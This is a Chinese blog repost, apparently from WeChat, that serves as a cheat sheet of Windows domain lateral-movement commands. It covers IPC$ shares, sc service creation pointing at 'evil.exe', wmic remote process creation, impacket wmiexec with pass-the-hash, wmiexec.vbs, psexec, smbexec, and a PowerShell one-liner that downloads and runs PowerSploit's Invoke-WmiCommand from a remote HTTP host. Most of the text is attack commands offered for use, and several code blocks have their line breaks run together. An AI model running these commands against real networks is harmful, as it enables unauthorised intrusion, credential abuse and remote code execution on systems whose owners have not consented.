> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/SKrn7kSd5C4m8SZYBYqt-g)

域环境搭建
=====

参考 https://blog.csdn.net/niexinming/article/details/75650128

开启和 admin

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyzibNibj36CHSSudETw4pzic4zqVddQMmKbtibRnsiaBNDu2FW5ptwWicc6J3QiaOvfkCuzoDDI0MPwOLCw/640?wx_fmt=png)

```
net share $ipcnet share $admin
```

直接执行

```
dir \\IP\c$
tasklist /S IP /U 用户 /P 密码
```

sc
==

```
sc \\[HOST] create boom binpath= c:\evil.exe
sc \\[HOST] start boom
sc \\[HOST] delete boom
```

wmic
====

```
wmic /node:172.18.16.172 /user:admin /password:password  process call create "cmd.exe /c ipconfig>c:\result.txt"
```

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyzibNibj36CHSSudETw4pzic4Bsibvibam2x3Rgg7yhFSia77ibhBo5AayicJ0xs5vVu8kNr4MGxbL1bWYMQ/640?wx_fmt=png)

wmiexec.py  

=============

安装:

```
git clone https://github.com/CoreSecurity/impacket.gitcd impacket/pip install
```

用户密码

```
python wmiexec.py 用户名:密码@目标IP
```

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyzibNibj36CHSSudETw4pzic4wxic46ibrEzeyIQFM17Fa7umWnZQOGkuWqAvA4BZTOGCNKIoHiasu7Ijw/640?wx_fmt=png)

哈希传递  

```
python wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@目标IP
```

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyzibNibj36CHSSudETw4pzic4VwicOaFKX4TL5PNibwAQuiaaxuACngeut5fH5ibMyfNqVnKnKZdT5jYfQQ/640?wx_fmt=png)

wmiexec.vbs  

==============

```
cscript.exe wmiexec.vbs /cmd 172.18.16.172 administrator password “command”
```

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyzibNibj36CHSSudETw4pzic44X9O5DV950Xog379YcaO8G2xWTyQtgSY61yjcEoskIbQef25gNb8ibQ/640?wx_fmt=png)

powershell 工具  

================

```
Invoke-WmiCommand.ps1是PowerSploit中的一个脚本工具，该脚本主要通过powershell调用WMI来远程执行命令，本质上还是利用WMI。
```

下载地址：https://github.com/PowerShellMafia/PowerSploit

```
git clone https://github.com/PowerShellMafia/PowerSploit.gitcd PowerSploit-master\PowerSploit-master\CodeExecutionpython –m SimpleHTTPServerpowershellIEX(New-Object Net.Webclient).DownloadString('http://xx.xx.xx.xx//Invoke-WmiCommand.ps1')$User = "域名\用户名"     // 指定目标系统用户名$Password = ConvertTo-SecureString -String "文明密码" -AsPlainText -Force   // 指定目标系统的密码$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password    // 将账号和密码整合起来，以便导入credential$Remote = Invoke-WmiCommand -Payload {要执行的命令} -Credential $Cred -ComputerName 目标IP$Remote.PayloadOutput       // 将执行结果输出到屏幕上
```

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyzibNibj36CHSSudETw4pzic4Vwe2PUicia0dbibcxms0coSvUficCPm8ACBO5F2VdV5QtDpQkviclYJNibwQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyzibNibj36CHSSudETw4pzic4U9L9GF1rB39PFTicnbg71UpX6rYGia2SEKgibKkOIH69MO9zxGvmnzicLg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyzibNibj36CHSSudETw4pzic4nmeiafIRaiaj3Y8qLdgo6Gic67YibgtBj64MfUJMWSUSPIQnMWnfJowywA/640?wx_fmt=png)

Invoke-WMIMethod.ps1(无回显)  

Invoke-WMIMethod.ps1 模块是 powershell 自带的，可以在远程系统中执行命令和指定程序。在 powershell 命令行环境执行如下命令，可以以非交互式的方式执行远程命令，但不会回显执行结果。

```
$User="域名\用户名"    // 指定目标系统用户名$Password=ConvertTo-SecureString -String "密码" -AsPlainText -Force   // 指定目标系统密码$Cred=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password     // 将账号和密码整合起来，以便导入 Credential中Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName "目标机IP" -Credential $Cred   // 在远程系统中运行notepad.exe命令
```

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyzibNibj36CHSSudETw4pzic4DsR6NbOtHLZ9KqJ8W9DVCPZYZf5ZibXj3r3Su8XeW2mbqQJXmzDiacHg/640?wx_fmt=png)

psexec  

=========

```
psexec.exe \\ip –u 账号 –p 密码 cmd.exe /c ipconfig 
```

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyzibNibj36CHSSudETw4pzic4UiaDX8pH9UYc9lKB5I8dOyfaN4LJQibiaamyaN83cAicCJBby6TniclUvrw/640?wx_fmt=png)

smbexec  

==========

```
https://github.com/SecureAuthCorp/impacket
smbexec.py 用户名:密码@IP
```

参考文档
====

https://www.freebuf.com/articles/network/246440.html https://cloud.tencent.com/developer/article/1752145

作者：Leticia's Blog ，详情点击阅读原文。

**推荐阅读**[**![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyIDG0WicDG27ztM2s7iaVSWKiaPdxYic8tYjCatQzf9FicdZiar5r7f7OgcbY4jFaTTQ3HibkFZIWEzrsGg/640?wx_fmt=png)**](http://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247496904&idx=1&sn=e6c717bc2709f7c4ec8523bc681f43f3&chksm=9acd2457adbaad4169ed38ebf0d969553b6cf4dee26307f2ce6a137c52849e4ffdf06325347e&scene=21#wechat_redirect)  

公众号

**觉得不错点个 **“赞”**、“在看”，支持下小编****![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1YhlAJOGvAaVRV0ZSSnX46ibouOHe05icukBYibdJOiaOpO06ic5eb0EMW1yhjMNRe1ibu5HuNibCcrGsqw/640?wx_fmt=png)**